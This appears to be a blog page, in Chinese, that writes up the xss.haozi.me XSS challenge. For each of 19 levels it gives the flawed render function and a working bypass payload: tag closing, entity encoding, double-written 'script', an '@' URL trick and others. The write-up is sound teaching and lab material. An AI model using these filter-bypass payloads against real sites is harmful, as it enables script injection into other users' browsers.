@@ -1,0 +1,730 @@
+<html>
+
+<head>
+  <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>XSS game alert(1) writeup | 3ND</title>
+<link rel="shortcut icon" href="https://github.com/inspiringz/inspiringz.github.io/favicon.ico?v=1627821474317">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://github.com/inspiringz/inspiringz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="XSS game alert(1) writeup | 3ND - Atom Feed" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+平台地址：https://xss.haozi.me/
+Github项目：https://github.com/haozi/xss-demo
+
+0x00
+
+server code
+
+function render (input) {
+  r..." />
+    <meta name="keywords" content="XSS,Writeup,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <!--<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>-->
+    <script src="/media/highlight.min.js"></script>
+</head>
+
+<body>
+  <div class="main">
+    <div class="main-content">
+      <div class="site-header">
+  <a href="https://github.com/inspiringz/inspiringz.github.io">
+  <img class="avatar" src="https://github.com/inspiringz/inspiringz.github.io/images/avatar.png?v=1627821474317" alt="">
+  </a>
+  <h1 class="site-title">
+    3ND
+  </h1>
+  <p class="site-description">
+    夏が終わった
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/inspiringz" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              XSS game alert(1) writeup
+            </h2>
+            <div class="post-info">
+              <span>
+                2019-04-25
+              </span>
+              <span>
+                11 min read
+              </span>
+              <span class="page-view" key="20190425210800" title="XSS game alert(1) writeup">
+              </span>
+              
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/xss/" class="post-tag">
+                  # XSS
+                </a>
+                
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/writeup/" class="post-tag">
+                  # Writeup
+                </a>
+                
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/ctf/" class="post-tag">
+                  # CTF
+                </a>
+                
+            </div>
+            
+                <div class="post-content-wrapper">
+                  <div class="post-content">
+                    <ul>
+<li>平台地址：<a href="https://xss.haozi.me/#/0x00">https://xss.haozi.me/</a></li>
+<li>Github项目：<a href="https://github.com/haozi/xss-demo">https://github.com/haozi/xss-demo</a></li>
+</ul>
+<h2 id="0x00">0x00</h2>
+<ul>
+<li>server code</li>
+</ul>
+<pre><code class="language-js">function render (input) {
+  return '&lt;div&gt;' + input + '&lt;/div&gt;'
+}
+</code></pre>
+<ul>
+<li>input code</li>
+</ul>
+<pre><code class="language-html">&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<ul>
+<li>html</li>
+</ul>
+<pre><code class="language-html">&lt;div&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/div&gt;
+</code></pre>
+<h2 id="0x01">0x01</h2>
+<ul>
+<li>server code</li>
+</ul>
+<pre><code class="language-js">function render (input) {
+  return '&lt;textarea&gt;' + input + '&lt;/textarea&gt;'
+}
+</code></pre>
+<ul>
+<li>input code</li>
+</ul>
+<pre><code class="language-html">&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt; //闭合&lt;textarea&gt;即可
+</code></pre>
+<ul>
+<li>html</li>
+</ul>
+<pre><code class="language-html">&lt;textarea&gt;&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/textarea&gt;
+</code></pre>
+<h2 id="0x02">0x02</h2>
+<ul>
+<li>server code</li>
+</ul>
+<pre><code class="language-js">function render (input) {
+  return '&lt;input type=&quot;name&quot; value=&quot;' + input + '&quot;&gt;'
+}
+</code></pre>
+<ul>
+<li>方法1 闭合标签</li>
+</ul>
+<pre><code class="language-html">//input code
+&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
+//html
+&lt;input type=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;&gt;
+</code></pre>
+<ul>
+<li>方法2 通过autofocus属性执行本身的focus事件</li>
+</ul>
+<pre><code class="language-html">// input code
+ &quot;  autofocus onfocus=&quot;alert(1);
+//html
+&lt;input type=&quot;name&quot; value=&quot; &quot;  autofocus onfocus=&quot;alert(1);&quot;&gt;
+</code></pre>
+<h2 id="0x03">0x03</h2>
+<ul>
+<li>server code</li>
+</ul>
+<pre><code class="language-js">function render (input) {
+  const stripBracketsRe = /[()]/g
+  input = input.replace(stripBracketsRe, '') //正则匹配过滤了()
+  return input
+}
+</code></pre>
+<ul>
+<li>方法1 反引号`绕过</li>
+</ul>
+<pre><code class="language-html">//input code
+&lt;script&gt;alert`1`;&lt;/script&gt;
+//html
+&lt;script&gt;alert`1`;&lt;/script&gt;
+</code></pre>
+<ul>
+<li>方法2 编码绕过</li>
+</ul>
+<p>HTML实体编码绕过关键字过滤, HTML标签内的实体编码会自动解码。</p>
+<ul>
+<li>
+<p>1.进制编码:<code>&amp;#xH;</code>(16进制格式)、(10进制形式)，最后的分号可以不要。</p>
+</li>
+<li>
+<p>2.HTML实体编码，即HTMLEncode。</p>
+</li>
+</ul>
+<p>Js支持的编码格式：</p>
+<ul>
+<li>
+<p>Unicode形式：<code>\uH</code>(十六进制)。</p>
+</li>
+<li>
+<p>普通16进制：<code>\xH</code>。</p>
+</li>
+<li>
+<p>纯转义：<code>\'</code>、<code>\&quot;</code>、<code>\&lt;</code>、<code>\&gt;</code>这样在特殊字符之前加<code>\</code>进行转义。</p>
+</li>
+</ul>
+<pre><code class="language-html">//input code
+&lt;img src=x onerror=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt;
+//html
+&lt;img src=x onerror=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt;
+</code></pre>
+<h2 id="0x04">0x04</h2>
+<ul>
+<li>server code</li>
+</ul>
+<pre><code class="language-js">function render (input) {
+  const stripBracketsRe = /[()`]/g
+  input = input.replace(stripBracketsRe, '')
+  return input
+}
+</code></pre>
+<ul>
+<li>solution</li>
+</ul>
+<p>在上道题目的基础上对**`**进行了过滤，进制编码即可绕过。</p>
+<pre><code class="language-html">//input code
+&lt;img src=x onerror=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt;
+//html
+&lt;img src=x onerror=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt;
+</code></pre>
+<h2 id="0x05">0x05</h2>
+<ul>
+<li>server code</li>
+</ul>
+<pre><code class="language-js">function render (input) {
+  input = input.replace(/--&gt;/g, ':)')
+  return '&lt;!-- ' + input + ' --&gt;'
+}
+</code></pre>
+<ul>
+<li>solution</li>
+</ul>
+<p>匹配<code>--&gt;</code>替换为<code>:)</code>，可以使用<code>--!&gt;</code>闭合注释进行绕过。</p>
+<pre><code class="language-html">//input code
+--!&gt;&lt;script&gt;alert(1);&lt;/script&gt;
+//html
+!-- --!&gt;&lt;script&gt;alert(1);&lt;/script&gt; --&gt;
+</code></pre>
+<h2 id="0x06">0x06</h2>
+<ul>
+<li>server code</li>
+</ul>
+<pre><code class="language-js">function render (input) {
+  input = input.replace(/auto|on.*=|&gt;/ig, '_')
+  return `&lt;input value=1 ${input} type=&quot;text&quot;&gt;`
+}
+</code></pre>
+<ul>
+<li>solution</li>
+</ul>
+<p>过滤了<code>auto</code>、<code>onxxxx=</code>以及<code>&gt;</code>关键字段。可利用换行<code>\n</code>绕过。</p>
+<pre><code class="language-html">//input code
+onmousemove
+= alert(1)
+//html
+&lt;input value=1 onmousemove
+= alert(1) type=&quot;text&quot;&gt;
+</code></pre>
+<h2 id="0x07">0x07</h2>
+<ul>
+<li>server code</li>
+</ul>
+<pre><code class="language-js">function render (input) {
+  const stripTagsRe = /&lt;\/?[^&gt;]+&gt;/gi
+
+  input = input.replace(stripTagsRe, '')
+  return `&lt;article&gt;${input}&lt;/article&gt;`
+}
+</code></pre>
+<ul>
+<li>solution</li>
+</ul>
+<p>正则匹配过滤了<code>&lt;</code>开头<code>&gt;</code>结尾的字符串内容。利用浏览器HTML解析里的容错机制进行绕过，不闭合<code>&gt;</code>。</p>
+<pre><code class="language-js">//input code
+&lt;svg/onload='alert(1)'
+//html
+&lt;article&gt;&lt;svg/onload='alert(1)'&lt;/article&gt;
+</code></pre>
+<h2 id="0x08">0x08</h2>
+<ul>
+<li>server code</li>
+</ul>
+<pre><code class="language-js">function render (src) {
+  src = src.replace(/&lt;\/style&gt;/ig, '/* \u574F\u4EBA */')
+  return `
+    &lt;style&gt;
+      ${src}
+    &lt;/style&gt;
+  `
+}
+</code></pre>
+<ul>
+<li>solution</li>
+</ul>
+<p>正则匹配替换<code>&lt;/style&gt;</code>为<code>/* 坏人 */</code>，不区分大小写。可对</style>属性进行空白字符隔开进行绕过。</p>
+<pre><code class="language-html">//input code
+//1.style后加空格
+&lt;/style &gt;&lt;svg/onload='alert(1)'&gt;
+//2.style后换行
+&lt;/style
+&gt;&lt;svg/onload='alert(1)'&gt;
+//html
+&lt;style&gt;
+      &lt;/style &gt;&lt;svg/onload='alert(1)'&gt;
+    &lt;/style&gt;
+</code></pre>
+<h2 id="0x09">0x09</h2>
+<ul>
+<li>server code</li>
+</ul>
+<pre><code class="language-js">function render (input) {
+  let domainRe = /^https?:\/\/www\.segmentfault\.com/
+  if (domainRe.test(input)) {
+    return `&lt;script src=&quot;${input}&quot;&gt;&lt;/script&gt;`
+  }
+  return 'Invalid URL'
+}
+</code></pre>
+<ul>
+<li>solution</li>
+</ul>
+<p>正则匹配以<code>https://www.segmentfault.com</code>开头的输入字段<code>input</code>，若无匹配返回失败；可以构造满足条件的<code>input</code>对标签进行闭合，插入js脚本，并注释结尾<code>&gt;&lt;/script&gt;</code>。</p>
+<pre><code class="language-html">//input code
+https://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt; //
+//html
+&lt;script src=&quot;https://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt; //&quot;&gt;&lt;/script&gt;
+</code></pre>
+<h2 id="0x0a">0x0A</h2>
+<ul>
+<li>server code</li>
+</ul>
+<pre><code class="language-js">function render (input) {
+  function escapeHtml(s) {
+    return s.replace(/&amp;/g, '&amp;amp;')
+            .replace(/'/g, '&amp;#39;')
+            .replace(/&quot;/g, '&amp;quot;')
+            .replace(/&lt;/g, '&amp;lt;')
+            .replace(/&gt;/g, '&amp;gt;')
+            .replace(/\//g, '&amp;#x2f')
+  }
+
+  const domainRe = /^https?:\/\/www\.segmentfault\.com/
+  if (domainRe.test(input)) {
+    return `&lt;script src=&quot;${escapeHtml(input)}&quot;&gt;&lt;/script&gt;`
+  }
+  return 'Invalid URL'
+}
+</code></pre>
+<ul>
+<li>solution</li>
+</ul>
+<p>对输入的<code>input</code>字段中的<code>&amp;</code>、<code>'</code>、<code>&quot;</code>、<code>&lt;</code>、<code>&gt;</code>、<code>/</code>进行HTML实体编码过滤，输出点为<code>src</code>属性。利用URL的<code>@</code>特性引入外部js进行绕过,<code>https://www.segmentfault.com@xss.haozi.me/j.js</code>中实际加载为<code>@</code>后的URL地址。</p>
+<pre><code class="language-html">//input code
+https://www.segmentfault.com@xss.haozi.me/j.js
+//html
+&lt;script src=&quot;https:&amp;#x2f&amp;#x2fwww.segmentfault.com@xss.haozi.me&amp;#x2fj.js&quot;&gt;&lt;/script&gt;
+</code></pre>
+<h2 id="0x0b">0x0B</h2>
+<ul>
+<li>server code</li>
+</ul>
+<pre><code class="language-js">function render (input) {
+  input = input.toUpperCase()
+  return `&lt;h1&gt;${input}&lt;/h1&gt;`
+}
+</code></pre>
+<p>将输入的<code>input</code>字段全转化为大写字母。</p>
+<p>1、html标签大小写不敏感，可以直接引入外部js文件绕过。</p>
+<p>2、js严格区分大小写，解析环境为html标签内可以使用html实体编码绕过。</p>
+<ul>
+<li>solution</li>
+</ul>
+<pre><code class="language-html">//input code
+&lt;script src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/script&gt;
+&lt;img src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;&gt;
+//html
+&lt;h1&gt;&lt;SCRIPT SRC=&quot;HTTPS://XSS.HAOZI.ME/J.JS&quot;&gt;&lt;/SCRIPT&gt;&lt;/h1&gt;
+&lt;h1&gt;&lt;IMG SRC=X ONERROR=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;&gt;&lt;/h1&gt;
+</code></pre>
+<h2 id="0x0c">0x0C</h2>
+<ul>
+<li>server code</li>
+</ul>
+<pre><code class="language-js">function render (input) {
+  input = input.replace(/script/ig, '')
+  input = input.toUpperCase()
+  return '&lt;h1&gt;' + input + '&lt;/h1&gt;'
+}
+</code></pre>
+<ul>
+<li>solution</li>
+</ul>
+<p>不区分大小写将<code>script</code>关键字替换为空后将字符串内容转化为大写。可以通过双写<code>script</code>进行绕过。</p>
+<pre><code class="language-html">//input code
+&lt;scscriptript src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/scscriptript&gt;
+//html
+&lt;h1&gt;&lt;SCRIPT SRC=&quot;HTTPS://XSS.HAOZI.ME/J.JS&quot;&gt;&lt;/SCRIPT&gt;&lt;/h1&gt;
+</code></pre>
+<h2 id="0x0d">0x0D</h2>
+<ul>
+<li>server code</li>
+</ul>
+<pre><code class="language-js">function render (input) {
+  input = input.replace(/[&lt;/&quot;']/g, '')
+  return `
+    &lt;script&gt;
+          // alert('${input}')
+    &lt;/script&gt;
+  `
+}
+</code></pre>
+<ul>
+<li>solution</li>
+</ul>
+<p>正则匹配<code>&lt;</code>、<code>/</code>、<code>&quot;</code>、<code>'</code>替换为空。由于过滤了<code>/</code>，js注释中的<code>//</code>、<code>/**/</code>不可用，可用HTML注释<code>--&gt;</code>进行绕过。</p>
+<pre><code class="language-html">//input code
+
+alert(1);
+--&gt;
+//html
+&lt;script&gt;
+          // alert('
+alert(1);
+--&gt;')
+    &lt;/script&gt;
+</code></pre>
+<h2 id="0x0e">0x0E</h2>
+<ul>
+<li>server code</li>
+</ul>
+<pre><code class="language-js">function render (input) {
+  input = input.replace(/&lt;([a-zA-Z])/g, '&lt;_$1')
+  input = input.toUpperCase()
+  return '&lt;h1&gt;' + input + '&lt;/h1&gt;'
+}
+</code></pre>
+<ul>
+<li>solution</li>
+</ul>
+<p>过滤了<code>&lt;</code>开头字符串，替换为<code>&lt;_</code>，并全部转化为大写字母。解法来自于古英语：字符<code>ſ</code>大写后为S（ſ不等于s）。</p>
+<pre><code class="language-html">//input code
+&lt;ſcript src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/script&gt;
+//html
+&lt;h1&gt;&lt;SCRIPT SRC=&quot;HTTPS://XSS.HAOZI.ME/J.JS&quot;&gt;&lt;/SCRIPT&gt;&lt;/h1&gt;
+</code></pre>
+<h2 id="0x0f">0x0F</h2>
+<ul>
+<li>server code</li>
+</ul>
+<pre><code class="language-js">function render (input) {
+  function escapeHtml(s) {
+    return s.replace(/&amp;/g, '&amp;amp;')
+            .replace(/'/g, '&amp;#39;')
+            .replace(/&quot;/g, '&amp;quot;')
+            .replace(/&lt;/g, '&amp;lt;')
+            .replace(/&gt;/g, '&amp;gt;')
+            .replace(/\//g, '&amp;#x2f;')
+  }
+  return `&lt;img src onerror=&quot;console.error('${escapeHtml(input)}')&quot;&gt;`
+}
+</code></pre>
+<ul>
+<li>solution</li>
+</ul>
+<p>输出点为HTML标签<code>img</code>内，所以HTML实体编码无影响。</p>
+<pre><code class="language-html">//input code
+');alert('1
+//html
+&lt;img src onerror=&quot;console.error('&amp;#39;);alert(&amp;#39;1')&quot;&gt;
+</code></pre>
+<h2 id="0x10">0x10</h2>
+<ul>
+<li>server code</li>
+</ul>
+<pre><code class="language-js">function render (input) {
+  return `
+&lt;script&gt;
+  window.data = ${input}
+&lt;/script&gt;
+  `
+}
+</code></pre>
+<ul>
+<li>solution</li>
+</ul>
+<p>闭合输出即可。</p>
+<pre><code class="language-html">//input code
+'1';alert(1)
+//html
+&lt;script&gt;
+  window.data = '1';alert(1)
+&lt;/script&gt;
+</code></pre>
+<h2 id="0x11">0x11</h2>
+<ul>
+<li>server code</li>
+</ul>
+<pre><code class="language-js">// from alf.nu
+function render (s) {
+  function escapeJs (s) {
+    return String(s)
+            .replace(/\\/g, '\\\\')
+            .replace(/'/g, '\\\'')
+            .replace(/&quot;/g, '\\&quot;')
+            .replace(/`/g, '\\`')
+            .replace(/&lt;/g, '\\74')
+            .replace(/&gt;/g, '\\76')
+            .replace(/\//g, '\\/')
+            .replace(/\n/g, '\\n')
+            .replace(/\r/g, '\\r')
+            .replace(/\t/g, '\\t')
+            .replace(/\f/g, '\\f')
+            .replace(/\v/g, '\\v')
+            // .replace(/\b/g, '\\b')
+            .replace(/\0/g, '\\0')
+  }
+  s = escapeJs(s)
+  return `
+&lt;script&gt;
+  var url = 'javascript:console.log(&quot;${s}&quot;)'
+  var a = document.createElement('a')
+  a.href = url
+  document.body.appendChild(a)
+  a.click()
+&lt;/script&gt;
+`
+}
+</code></pre>
+<ul>
+<li>solution</li>
+</ul>
+<p>闭合标签。</p>
+<pre><code class="language-html">//input code
+&quot;),alert(1)//
+//html
+&lt;script&gt;
+  var url = 'javascript:console.log(&quot;\&quot;),alert(1)\/\/&quot;)'
+  var a = document.createElement('a')
+  a.href = url
+  document.body.appendChild(a)
+  a.click()
+&lt;/script&gt;
+</code></pre>
+<h2 id="0x12">0x12</h2>
+<ul>
+<li>server code</li>
+</ul>
+<pre><code class="language-js">// from alf.nu
+function escape (s) {
+  s = s.replace(/&quot;/g, '\\&quot;')
+  return '&lt;script&gt;console.log(&quot;' + s + '&quot;);&lt;/script&gt;'
+}
+</code></pre>
+<ul>
+<li>solution</li>
+</ul>
+<p>正则匹配<code>&quot;</code>，<code>&quot;</code>替换成&quot;，在实际输出中可以在添一个<code>\</code>来转义掉第一个<code>\</code>绕过，<code>\&quot;</code>-&gt;<code>\\&quot;</code>-&gt;即为&quot;。</p>
+<pre><code class="language-html">//input code
+\&quot;);alert(1);//
+//html
+&lt;script&gt;console.log(&quot;\\&quot;);alert(1);//&quot;);&lt;/script&gt;
+</code></pre>
+
+                  </div>
+                  <div class="toc-container">
+                    <div style="position: sticky;
+                    top: 20px;">
+                    <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#0x00">0x00</a></li>
+<li><a href="#0x01">0x01</a></li>
+<li><a href="#0x02">0x02</a></li>
+<li><a href="#0x03">0x03</a></li>
+<li><a href="#0x04">0x04</a></li>
+<li><a href="#0x05">0x05</a></li>
+<li><a href="#0x06">0x06</a></li>
+<li><a href="#0x07">0x07</a></li>
+<li><a href="#0x08">0x08</a></li>
+<li><a href="#0x09">0x09</a></li>
+<li><a href="#0x0a">0x0A</a></li>
+<li><a href="#0x0b">0x0B</a></li>
+<li><a href="#0x0c">0x0C</a></li>
+<li><a href="#0x0d">0x0D</a></li>
+<li><a href="#0x0e">0x0E</a></li>
+<li><a href="#0x0f">0x0F</a></li>
+<li><a href="#0x10">0x10</a></li>
+<li><a href="#0x11">0x11</a></li>
+<li><a href="#0x12">0x12</a></li>
+</ul>
+</li>
+</ul>
+
+                  </div>
+                  </div>
+                </div>
+          </article>
+        </div>
+
+        
+          <div class="nearby-post" style="padding: 24px 32px;">
+            <div class="prev-post" style="float: left;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter;text-align: left;">上一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-05-19-SQLi-labs-Advance-Injection/">
+                <h3 class="post-title" style="text-align: left;">
+                  SQLi-labs Advanced Injection
+                </h3>
+              </a>
+            </div>
+            <div class="next-posts" style="float: right;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter; text-align: right;">下一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-04-25-SUSCTF-2nd-Web-Write-Up/">
+                <h3 class="post-title" style="
+                text-align: right;">
+                  SUSCTF 2nd Web Write Up
+                </h3>
+              </a>
+            </div>
+          </div>
+          
+
+                
+
+                                <div class="site-footer">
+  
+  <a class="rss" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+    </div>
+  </div>
+
+  <script>
+    hljs.highlightAll();
+
+    let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+    // This should probably be throttled.
+    // Especially because it triggers during smooth scrolling.
+    // https://lodash.com/docs/4.17.10#throttle
+    // You could do like...
+    // window.addEventListener("scroll", () => {
+    //    _.throttle(doThatStuff, 100);
+    // });
+    // Only not doing it here to keep this Pen dependency-free.
+
+    window.addEventListener("scroll", event => {
+      let fromTop = window.scrollY;
+
+      mainNavLinks.forEach((link, index) => {
+        let section = document.getElementById(decodeURI(link.hash).substring(1));
+        let nextSection = null
+        if (mainNavLinks[index + 1]) {
+          nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+        }
+        if (section.offsetTop <= fromTop) {
+          if (nextSection) {
+            if (nextSection.offsetTop > fromTop) {
+              link.classList.add("current");
+            } else {
+              link.classList.remove("current");
+            }
+          } else {
+            link.classList.add("current");
+          }
+        } else {
+          link.classList.remove("current");
+        }
+      });
+    });
+  </script>
+<script src="/media/view-support.js"></script>
+<script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js'], function () {
+    var pageview = window.pageview(AV, {
+      appId: 'HRVNDkHV80Fpk9M8c5GQqjwy-gzGzoHsz',
+      appKey: 'nsyqncNCSWSOkkns1wvDlUrh',
+      appClass: 'Gridea',
+    });
+    $('.page-view').each(function () {
+      var $this = $(this);
+      var key = $this.attr('key');
+      var title = $this.attr('title');
+      pageview.increase(key, title, function(view) {
+        $("[key='" + key +"']").text(view+' views');
+      });
+    });
+  });
+</script>
+
+</body>
+
+</html>
